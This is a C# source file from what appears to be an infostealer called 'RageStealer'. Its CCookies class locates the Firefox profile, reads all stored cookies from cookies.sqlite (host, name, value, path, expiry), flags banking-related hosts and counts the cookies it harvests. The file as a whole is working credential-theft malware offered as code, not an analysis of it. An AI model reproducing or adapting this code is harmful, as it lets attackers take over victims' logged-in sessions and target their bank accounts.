using System;
using System.Collections.Generic;
using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Browsers.Firefox;

internal sealed class CCookies
{
	private static string GetCookiesDbPath(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\cookies.sqlite"))
					{
						return text + "\\cookies.sqlite";
					}
				}
			}
		}
		catch (Exception)
		{
		}
		return null;
	}

	public static List<Cookie> Get(string path)
	{
		List<Cookie> list = new List<Cookie>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(GetCookiesDbPath(path), "moz_cookies");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Cookie cookie = default(Cookie);
				cookie.HostKey = sqLite.GetValue(i, 4);
				cookie.Name = sqLite.GetValue(i, 2);
				cookie.Value = sqLite.GetValue(i, 3);
				cookie.Path = sqLite.GetValue(i, 5);
				cookie.ExpiresUtc = sqLite.GetValue(i, 6);
				Cookie item = cookie;
				list.Add(item);
				Banking.ScanData(item.HostKey);
				Counter.Cookies++;
			}
		}
		catch (Exception)
		{
		}
		return list;
	}
}
